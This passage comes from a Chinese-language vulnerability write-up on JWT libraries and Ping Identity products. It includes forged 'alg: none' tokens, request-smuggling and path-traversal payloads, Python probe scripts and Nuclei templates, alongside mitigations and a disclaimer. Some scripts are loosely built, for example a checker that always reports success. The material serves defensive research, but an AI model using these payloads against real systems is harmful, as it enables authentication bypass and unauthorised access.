GET /api/protected-resource HTTP/1.1
Host: target-api.example.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.
```

（注意：上述 Token 的头部为 `alg: "none"`，无签名部分）

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2020-15084 检测脚本 - express-jwt 算法未强制"""
import requests
import sys
import base64
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_none_alg_token(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    return f"{h}.{p}."

def check(target, protected_paths=None):
    if protected_paths is None:
        protected_paths = ["/api", "/api/v1", "/api/me", "/api/user"]

    forged = create_none_alg_token({
        "sub": "test@test.com",
        "iat": 1700000000
    })

    for path in protected_paths:
        url = f"https://{target}{path}"
        try:
            r_normal = requests.get(url, timeout=10, verify=False)
            r_forged = requests.get(
                url,
                headers={"Authorization": f"Bearer {forged}"},
                timeout=10,
                verify=False
            )
            if r_normal.status_code in (401, 403) and r_forged.status_code == 200:
                print(f"[+] 路径 {path} 存在算法绕过！")
                print(f"    正常请求: {r_normal.status_code}")
                print(f"    伪造 Token: {r_forged.status_code}")
                return True
            elif r_normal.status_code == 401 and r_forged.status_code == 401:
                print(f"[*] 路径 {path}: Token 验证正常（401）")
        except Exception as e:
            print(f"[-] 路径 {path} 请求失败: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    if not result:
        print(f"[?] {sys.argv[1]} 未检测到明显的算法绕过")
        print("[*] 建议在 express-jwt 配置中显式指定 algorithms 参数")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2020-15084-express-jwt-alg-bypass

info:
  name: express-jwt Algorithm Bypass (CVE-2020-15084)
  author: x7peeps
  severity: critical
  description: express-jwt <= 5.3.3 在未指定 algorithms 参数时不强制算法验证，可导致认证绕过。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-15084
    - https://github.com/auth0/express-jwt/security/advisories/GHSA-6g6m-m6h5-w9gf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2020-15084
  tags: cve,cve2020,auth0,express-jwt,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/api"
      - "{{BaseURL}}/api/v1"
      - "{{BaseURL}}/api/me"
    stop-at-first-match: true
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwiaWF0IjoxNzAwMDAwMDAwfQ."

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
```

## 0x03 Ping Identity 高危漏洞分析

### 0x03.1 Ping Identity 产品架构

Ping Identity 是全球领先的企业级联合身份管理解决方案提供商，其产品被大量金融、政府和医疗行业的大型企业采用：

| 产品 | 定位 | 核心协议 |
|------|------|---------|
| **PingFederate** | 联邦身份服务器 | SAML 2.0、OIDC、WS-Federation、OAuth 2.0 |
| **PingAccess** | 访问控制网关 | 反向代理 + 策略引擎 |
| **PingDirectory** | 目录服务 | LDAP v3 |
| **PingAM** | 访问管理 | SAML、OIDC、Web Policy Agent |

PingFederate 在企业 SSO 架构中通常处于核心位置：

```
[用户浏览器]
      ↓
[PingFederate (IdP)]
      ├── SAML SP 端点
      ├── OAuth2/OIDC 端点
      ├── Admin Console
      └── REST API
      ↓
[PingAccess (网关)]
      ├── Web Policy Engine
      ├── Token Validation
      └── 反向代理
      ↓
[PingDirectory]
      ├── LDAP 接口
      └── 用户数据存储
      ↓
[企业应用 / 云服务]
```

### 0x03.2 CVE-2024-23316 — PingAccess HTTP 请求走私

#### 漏洞背景

CVE-2024-23316 是 PingAccess 中最严重的安全漏洞之一，允许攻击者通过精心构造的 HTTP 头部实现请求走私攻击。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2024-23316 |
| CVSS v3.1 | 8.8（High） |
| 受影响产品 | Ping Identity PingAccess |
| 受影响版本 | 所有版本 < 8.0.1 |
| 修复版本 | >= 8.0.1 |
| CWE | CWE-444（HTTP 请求走私） |

#### 漏洞原理

PingAccess 在解析 HTTP 请求头时存在不同步的处理逻辑。当 PingAccess 作为反向代理时，它对 HTTP 头部的解析方式与后端服务器不一致，导致 CL.TE（Content-Length vs Transfer-Encoding）请求走私变体：

```
攻击者 → PingAccess（前端代理）
              ↓ 解析 Transfer-Encoding: chunked
         后端服务器
              ↓ 解析 Content-Length
```

#### CL.TE 攻击变体 PoC

```http
POST /target-app/api HTTP/1.1
Host: pingaccess.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin/secret HTTP/1.1
Host: internal-server.local
```

#### TE.CL 攻击变体 PoC

```http
POST /target-app/api HTTP/1.1
Host: pingaccess.example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2024-23316 检测脚本 - PingAccess HTTP 请求走私"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    url = f"https://{target}/"
    try:
        r = requests.get(url, timeout=10, verify=False)
        server = r.headers.get('Server', '')
        if 'PingAccess' in server or 'pingaccess' in r.text.lower():
            print(f"[+] 检测到 PingAccess: {server}")

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Transfer-Encoding': 'chunked',
            'Content-Length': '3',
        }
        payload = b'8\r\nSMUGGLED\r\n0\r\n\r\n'
        r2 = requests.post(url, headers=headers, data=payload, timeout=10, verify=False)
        print(f"[*] 请求走私测试: HTTP {r2.status_code}")

        headers2 = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Transfer-Encoding': 'chunked',
            'Content-Length': '6',
        }
        payload2 = b'0\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n'
        r3 = requests.post(url, headers=headers2, data=payload2, timeout=10, verify=False)
        print(f"[*] CL.TE 测试: HTTP {r3.status_code}")

        return True
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    if result:
        print(f"[!] {sys.argv[1]} 需要确认 PingAccess 版本 < 8.0.1")
        print("[!] 升级至 PingAccess >= 8.0.1")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-23316-pingaccess-smuggling

info:
  name: PingAccess HTTP Request Smuggling (CVE-2024-23316)
  author: x7peeps
  severity: high
  description: PingAccess < 8.0.1 存在 HTTP 请求反序列化漏洞，攻击者可构造特殊 HTTP 头部实现请求走私。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-23316
    - https://support.pingidentity.com/s/document-item?language=en_US&bundleKey=PINGIDENTITY_2404&page=pingaccess_8_0_1_release_notes
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2024-23316
  tags: cve,cve2024,pingidentity,pingaccess,request-smuggling

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "PingAccess"
          - "pingaccess"
        condition: or
      - type: word
        words:
          - "X-PingAccess"
        part: header
```

### 0x03.3 CVE-2024-23983 — PingAccess URL 编码绕过

#### 漏洞背景

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2024-23983 |
| 受影响产品 | PingAccess |
| 漏洞类型 | URL 规范化处理不当导致请求规则绕过 |

#### 漏洞原理

PingAccess 在处理 URL 编码时，未能正确规范化请求路径。攻击者可以使用双重编码或非标准 URL 编码方式构造请求路径，绕过 PingAccess 的请求规则（Request Rules）。

例如，当管理员配置了阻止 `/admin/*` 路径的规则时：

```
/../../../etc/passwd
/%2e%2e/%2e%2e/etc/passwd
/..%252f..%252fetc/passwd
```

这些变体可能绕过 PingAccess 的路径检查，直接到达后端服务器。

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2024-23983 检测脚本 - PingAccess URL 编码绕过"""
import requests
import sys
import urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BYPASS_PAYLOADS = [
    "/admin/",
    "/%2e%2e/%2e%2e/admin/",
    "/..%252f..%252fadmin/",
    "/%2e%2e%2fadmin/",
    "/admin%20",
    "/admin%09",
    "/;/admin/",
    "/admin.json",
]

def check(target):
    url_base = f"https://{target}"
    try:
        r_normal = requests.get(f"{url_base}/admin/", timeout=10, verify=False)
        normal_code = r_normal.status_code
        print(f"[*] 正常 /admin/ 请求: HTTP {normal_code}")

        for payload in BYPASS_PAYLOADS:
            url = f"{url_base}{payload}"
            r = requests.get(url, timeout=10, verify=False, allow_redirects=False)
            if r.status_code == 200 and normal_code in (401, 403, 404):
                print(f"[+] 绕过成功: {payload} → HTTP {r.status_code}")
                return True
            elif r.status_code != normal_code:
                print(f"[*] 不同响应: {payload} → HTTP {r.status_code}")
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    if not result:
        print(f"[-] {sys.argv[1]} 未检测到明显的 URL 编码绕过")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-23983-pingaccess-url-bypass

info:
  name: PingAccess URL Encoding Bypass (CVE-2024-23983)
  author: x7peeps
  severity: medium
  description: PingAccess 对 URL 编码的规范化处理不当，可能导致请求规则被绕过。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-23983
  classification:
    cve-id: CVE-2024-23983
  tags: cve,cve2024,pingidentity,pingaccess,url-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/%2e%2e/%2e%2e/admin/"
      - "{{BaseURL}}/..%252f..%252fadmin/"
      - "{{BaseURL}}/..%2f..%2fadmin/"
    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 200
```

### 0x03.4 CVE-2025-27935 — PingFederate OTP MFA 绕过

#### 漏洞背景

CVE-2025-27935 是 PingFederate OTP Integration Kit 中的严重 MFA 绕过漏洞，允许攻击者在不提供第二因素认证的情况下完成登录。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2025-27935 |
| CVSS v3.1 | 8.6（High） |
| 受影响产品 | PingFederate OTP Integration Kit |
| 漏洞类型 | MFA 绕过 |
| CWE | CWE-287（不当认证） |

#### 漏洞原理

PingFederate 的 OTP Integration Kit 在处理多因素认证流程时存在两个关键缺陷：

1. **HTTP 方法验证不当**：OTP 验证端点未正确限制 HTTP 方法，攻击者可以使用非预期的 HTTP 方法（如 PUT、DELETE）绕过 OTP 提交步骤
2. **状态验证不当**：服务器在 OTP 验证前就推进了认证状态，允许攻击者跳过 OTP 输入步骤

攻击链：

```
1. 攻击者使用合法用户名/密码发起登录
2. PingFederate 进入 MFA 流程，要求输入 OTP
3. 攻击者不提交 OTP，而是使用非标准 HTTP 方法请求
4. 服务器状态机错误地推进认证状态
5. 攻击者直接获得认证完成的 Token
6. 以目标用户身份访问所有受保护资源
```

#### 检测方法

```python
#!/usr/bin/env python3
"""CVE-2025-27935 检测脚本 - PingFederate OTP MFA 绕过"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    otp_endpoints = [
        "/pf/startSLS.ping",
        "/pf/startSSO.ping",
        "/idp/startSSO.ping",
    ]

    methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]

    for endpoint in otp_endpoints:
        url = f"https://{target}{endpoint}"
        for method in methods:
            try:
                r = requests.request(
                    method, url, timeout=10, verify=False,
                    allow_redirects=False,
                    data={"username": "test", "password": "test"}
                )
                if r.status_code in (200, 302):
                    print(f"[+] {method} {endpoint} → HTTP {r.status_code}")
                    if r.status_code == 200:
                        print(f"    响应长度: {len(r.text)}")
            except Exception:
                continue

    print("[*] 需要在完整认证流程中验证 OTP 绕过")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    check(sys.argv[1])
    print(f"[?] {sys.argv[1]} 需要手动验证 OTP 绕过")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2025-27935-pingfederate-otp-bypass

info:
  name: PingFederate OTP MFA Bypass (CVE-2025-27935)
  author: x7peeps
  severity: high
  description: PingFederate OTP Integration Kit 未正确执行 HTTP 方法验证和状态验证，攻击者可绕过多因素认证。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-27935
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.6
    cve-id: CVE-2025-27935
  tags: cve,cve2025,pingidentity,pingfederate,mfa-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/pf/startSLS.ping"
      - "{{BaseURL}}/pf/startSSO.ping"
      - "{{BaseURL}}/idp/startSSO.ping"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302
      - type: word
        words:
          - "PingFederate"
          - "pf-"
        condition: or
```

### 0x03.5 CVE-2023-40702 — PingOne MFA skipMFA 漏洞

#### 漏洞背景

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2023-40702 |
| CVSS v3.1 | 7.7（High） |
| 受影响产品 | PingOne MFA Integration Kit |
| 漏洞类型 | MFA 配置绕过 |

#### 漏洞原理

PingOne MFA Integration Kit 中的 `skipMFA` 操作可以被配置为在用户已注册 MFA 设备的情况下跳过第二因素认证。如果攻击者已知目标用户的第一因素凭据（用户名/密码），可以利用此配置直接登录，无需通过已注册的 MFA 设备验证。

这本质上是一个配置层面的逻辑缺陷：`skipMFA` 的语义应该是"当用户未注册 MFA 时跳过"，但在某些配置下变成了"即使已注册也跳过"。

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2023-40702 检测脚本 - PingOne MFA skipMFA"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    endpoints = [
        "/pf/startSSO.ping",
        "/idp/startSSO.ping",
        "/pf/JITAuthn",
    ]

    for endpoint in endpoints:
        url = f"https://{target}{endpoint}"
        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=False)
            headers = dict(r.headers)
            if "Location" in headers and "login" in headers["Location"].lower():
                print(f"[+] 发现认证端点: {endpoint}")
                print(f"    重定向至: {headers['Location'][:100]}")
                return True
        except Exception:
            continue
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    check(sys.argv[1])
    print(f"[?] {sys.argv[1]} 需要手动验证 skipMFA 配置")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-40702-pingone-mfa-skip

info:
  name: PingOne MFA skipMFA Bypass (CVE-2023-40702)
  author: x7peeps
  severity: high
  description: PingOne MFA Integration Kit 的 skipMFA 操作可被配置为在用户已注册 MFA 设备时跳过第二因素认证。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-40702
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.7
    cve-id: CVE-2023-40702
  tags: cve,cve2023,pingidentity,pingone,mfa-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/pf/startSSO.ping"
      - "{{BaseURL}}/idp/startSSO.ping"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PingFederate"
          - "PingOne"
        condition: or
      - type: status
        status:
          - 200
          - 302
```

### 0x03.6 CVE-2023-36496 — PingDirectory 权限提升

#### 漏洞背景

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2023-36496 |
| CVSS v3.1 | 7.7（High） |
| 受影响产品 | PingDirectory |
| 漏洞类型 | 权限提升 |
| CWE | CWE-269（权限管理不当） |

#### 漏洞原理

当 PingDirectory 启用 Delegated Admin Privilege 虚拟属性提供程序插件时，已认证的低权限用户可以通过精心构造的 LDAP 操作提升其在 Directory Server 中的权限。攻击者可以利用该漏洞获取管理员级别的目录操作权限，包括修改用户属性、创建新用户、修改 ACL 等。

#### 检测方法

```python
#!/usr/bin/env python3
"""CVE-2023-36496 检测脚本 - PingDirectory 权限提升"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    admin_endpoints = [
        "/admin/api/v1 PingDirectory",
        "/directory/v1",
        "/admin/directory/server-info",
    ]
    url = f"https://{target}"
    try:
        r = requests.get(f"{url}/admin", timeout=10, verify=False)
        if r.status_code == 200:
            print(f"[+] PingDirectory Admin Console 可达")
        r2 = requests.get(f"{url}/admin/api/v1/PingDirectory/server-info",
                         timeout=10, verify=False)
        if r2.status_code == 200:
            print(f"[+] Server Info 端点可达，建议验证 Delegated Admin 配置")
            return True
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    check(sys.argv[1])
```

## 0x04 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE / 事件 | GitHub PoC | Exploit-DB | Nuclei | 在野利用 |
|------------|-----------|------------|--------|---------|
| CVE-2023-0093 (Okta ASA) | ❌ | ❌ | ❌ | ❌ |
| Okta HAR 劫持 | ❌ | ❌ | ❌ | ✅ |
| Okta LAPSUS$ | ❌ | ❌ | ❌ | ✅ |
| CVE-2022-23540 (jwt) | ✅ | ❌ | ✅ | ❌ |
| CVE-2022-23541 (jwt) | ✅ | ❌ | ✅ | ❌ |
| CVE-2022-23539 (jwt) | ✅ | ❌ | ❌ | ❌ |
| CVE-2022-23529 (jwt) | ✅ | ❌ | ❌ | ❌ |
| CVE-2020-15084 (express-jwt) | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-23316 (PingAccess) | ❌ | ❌ | ❌ | ❌ |
| CVE-2025-27935 (PingFederate) | ❌ | ❌ | ❌ | ❌ |
| CVE-2023-40702 (PingOne) | ❌ | ❌ | ❌ | ❌ |
| CVE-2023-36496 (PingDirectory) | ❌ | ❌ | ❌ | ❌ |

### 关键 PoC 仓库链接

| 仓库 | 描述 | 适用 CVE |
|------|------|----------|
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | JWT 全能攻击工具 | CVE-2022-23540/23541/23539 |
| [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) | 从 JWT Token 恢复 RSA 公钥 | 算法混淆攻击 |
| [hashcat](https://github.com/hashcat/hashcat) | JWT 密钥暴力破解 | 弱密钥场景 |

### 防守型验证思路

1. **JWT 算法混淆测试**：使用 jwt_tool 对目标 API 的 JWT 验证进行算法混淆测试
2. **`alg: none` 测试**：将 JWT 头部改为 `alg: "none"` 发送测试请求
3. **密钥类型检查**：验证 JWKS 端点返回的密钥类型与应用使用的算法是否匹配
4. **PingAccess 代理测试**：使用 CL.TE/TE.CL 变体测试反向代理的请求走私风险
5. **MFA 流程验证**：在完整认证流程中尝试使用不同 HTTP 方法绕过 MFA 步骤

## 0x05 共性攻击模式分析

### 模式一：JWT 算法混淆攻击

**影响范围**：Auth0 生态（jsonwebtoken、express-jwt、fast-jwt 等所有 JWT 实现）

**攻击原理**：
- 服务器使用 RS256（非对称）签名，公钥公开
- 攻击者将 `alg` 改为 HS256（对称），用公钥作为 HMAC 密钥签名
- 服务器在未限制算法时，使用公钥进行 HMAC 验证，签名匹配通过

**防御要点**：
- 在 `jwt.verify()` 中**必须**显式指定 `algorithms: ['RS256']`
- 永远不要信任 Token 头部中的 `alg` 字段
- 实施算法白名单机制

### 模式二：会话令牌窃取与重放

**影响范围**：Okta HAR 劫持、所有基于 Cookie/Token 的认证系统

**攻击原理**：
- 通过社会工程获取包含 Session Token 的 HAR 文件
- Session Token 与客户端 IP/设备未绑定
- 攻击者在不同环境中重放 Token

**防御要点**：
- 实施 Token 绑定（Token Binding / DPoP）
- 缩短 Session Token 生命周期
- 监控 Token 的地理/IP 异常

### 模式三：认证流程绕过

**影响范围**：PingAccess、Okta Classic Engine、PingFederate

**攻击原理**：
- 利用认证状态机的实现缺陷
- 使用非预期的 HTTP 方法或参数跳过验证步骤
- MFA 状态的客户端侧可篡改

**防御要点**：
- MFA 状态必须由服务端维护
- 对所有 HTTP 方法实施一致性验证
- 使用服务端 Session 而非客户端 Token 存储认证状态

### 模式四：供应链级影响

**影响范围**：jsonwebtoken（3100 万+周下载量）、express-jwt（300 万+）

**攻击原理**：
- 核心身份验证库的漏洞影响下游所有依赖者
- 版本升级存在破坏性变更，导致企业延迟修复
- 间接依赖可能在不知情的情况下引入漏洞版本

**防御要点**：
- 建立 SBOM（软件物料清单）追踪直接和间接依赖
- 使用 `npm audit` / Dependabot 持续监控
- 将关键安全库的版本更新纳入紧急补丁流程

### 模式五：企业联邦身份信任链滥用

**影响范围**：PingFederate SAML/OIDC 端点、Okta SSO

**攻击原理**：
- SAML/OIDC 联合认证中的信任链被滥用
- 通过 IdP 侧的配置缺陷绕过 SP 侧的策略
- 联邦 Token 的作用域限制不足

**防御要点**：
- 严格限制 IdP Token 的受众（audience）声明
- 实施 SP 侧的 Token 有效期和签发者验证
- 定期审计联邦信任关系配置

### 模式六：社会工程与身份平台结合

**影响范围**：Okta LAPSUS$ 攻击、HAR 劫持

**攻击原理**：
- 利用身份平台在企业中的核心地位，将社会工程攻击目标聚焦于身份管理员
- 通过第三方服务商的信任链间接访问身份平台
- 利用帮助台/IT 支持流程中的薄弱环节

**防御要点**：
- 第三方供应商实施同等安全标准
- 帮助台操作引入多因素验证和工单审批流程
- 实施特权操作的实时告警

## 0x06 应急排查与防守建议

### 紧急排查清单

| 优先级 | 排查项 | 检查方法 |
|--------|--------|----------|
| P0 | jsonwebtoken 版本检查 | `npm list jsonwebtoken`，确认 >= 9.0.0 |
| P0 | express-jwt algorithms 配置 | 检查代码中是否指定 `algorithms` 参数 |
| P0 | PingAccess 版本检查 | 确认 >= 8.0.1（CVE-2024-23316） |
| P1 | PingFederate OTP 配置 | 审查 MFA 插件配置（CVE-2025-27935） |
| P1 | PingOne MFA skipMFA | 审查 MFA 策略是否错误地跳过已注册用户的验证 |
| P1 | Okta Classic Engine | 确认是否已迁移至 Identity Engine |
| P2 | PingDirectory 权限 | 检查 Delegated Admin 插件配置 |
| P2 | JWT alg 白名单 | 扫描所有 JWT 验证代码，确认指定 algorithms |

### 日志关键字段表

| 日志源 | 关键字段 | 异常指标 |
|--------|----------|----------|
| PingFederate | `request.method` | 非标准 HTTP 方法（PUT/DELETE） |
| PingFederate | `authn.status` | MFA 跳过事件 |
| Okta System Log | `outcome.result` | 大量 MFA bypass 记录 |
| Okta System Log | `client.userAgent` | 异常 User-Agent |
| PingAccess | `request.path` | 编码变体路径（%2e%2e、%252f） |
| 各平台 | `token.alg` | 与预期不符的算法声明 |

### 紧急缓解措施

1. **升级 jsonwebtoken**：`npm install jsonwebtoken@latest`（>= 9.0.0）
2. **升级 PingAccess**：更新至 >= 8.0.1 修复 HTTP 请求走私
3. **配置 JWT 算法白名单**：在所有 JWT 验证处显式指定 algorithms
4. **强制 MFA 验证**：审查 PingFederate/PingOne 的 MFA 配置，确保无跳过路径
5. **限制 HAR 导出**：部署浏览器扩展清理 HAR 中的 Cookie 和 Token

### 长期安全加固建议

1. **SSO 平台架构加固**
   - 采用分层防御：SSO + 独立的 API 认证网关
   - 所有联邦 Token 实施 Token Binding
   - 实施持续自适应认证（Continuous Adaptive Authentication）

2. **依赖供应链安全**
   - 建立 SBOM 追踪所有身份验证相关依赖
   - 关键安全库升级纳入 24 小时紧急补丁 SLA
   - 使用 SCA（Software Composition Analysis）工具持续监控

3. **监控与检测**
   - 部署 UEBA 监控身份平台的异常行为模式
   - 对 JWT Token 的 `alg` 字段实施 DLP 检测规则
   - 建立身份平台操作的独立审计日志

## 0x07 免责声明

本文所有内容仅用于合法的安全研究、教育和授权的安全测试。作者：

1. 不鼓励或支持任何非法的计算机系统访问行为
2. 所有 PoC 代码和检测工具仅应在获得书面授权的目标环境中使用
3. 本文引用的所有 CVE 编号和安全事件均基于公开可验证的信息来源
4. 对于 Okta、Auth0、Ping Identity 等厂商的安全事件描述，基于厂商公开的安全公告和第三方安全研究报告
5. 读者应自行评估使用本文信息的法律风险，并确保遵守所在司法管辖区的法律法规

如有任何安全漏洞发现，请通过负责任的漏洞披露渠道（如 [HackerOne](https://hackerone.com/) 或厂商的 [漏洞报告页面](https://www.okta.com/vulnerability-reporting-policy/)）提交。

## 0x08 参考资料

1. [NIST NVD — CVE-2023-0093](https://nvd.nist.gov/vuln/detail/CVE-2023-0093)
2. [Okta Security Advisories](https://trust.okta.com/security-advisories/)
3. [Okta — HAR File Session Hijacking Advisory](https://sec.okta.com/articles/2023/10/)
4. [Okta Classic Application Sign-On Policy Bypass — Oct 2024](https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024)
5. [NIST NVD — CVE-2022-23540](https://nvd.nist.gov/vuln/detail/CVE-2022-23540)
6. [NIST NVD — CVE-2022-23541](https://nvd.nist.gov/vuln/detail/CVE-2022-23541)
7. [Auth0 Security Bulletin — jsonwebtoken CVE-2022-23540/23541/23539](https://auth0.com/docs/secure/security-guidance/security-bulletins/2022-12-21-jsonwebtoken)
8. [Unit 42 — CVE-2022-23529 JWT Secret Poisoning](https://unit42.paloaltonetworks.com/jsonwebtoken-vulnerability-cve-2022-23529/)
9. [NIST NVD — CVE-2020-15084](https://nvd.nist.gov/vuln/detail/CVE-2020-15084)
10. [NIST NVD — CVE-2024-23316](https://nvd.nist.gov/vuln/detail/CVE-2024-23316)
11. [Ping Identity CVE Advisories](https://support.pingidentity.com/s/topic/0TO8Z000000RGjwWAG/cve)
12. [NIST NVD — CVE-2025-27935](https://nvd.nist.gov/vuln/detail/CVE-2025-27935)
13. [NIST NVD — CVE-2023-40702](https://nvd.nist.gov/vuln/detail/CVE-2023-40702)
14. [NIST NVD — CVE-2023-36496](https://nvd.nist.gov/vuln/detail/CVE-2023-36496)
15. [CISA — Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
16. [PortSwigger — JWT Algorithm Confusion Attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
17. [Auth0 Blog — Critical Vulnerabilities in JWT Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)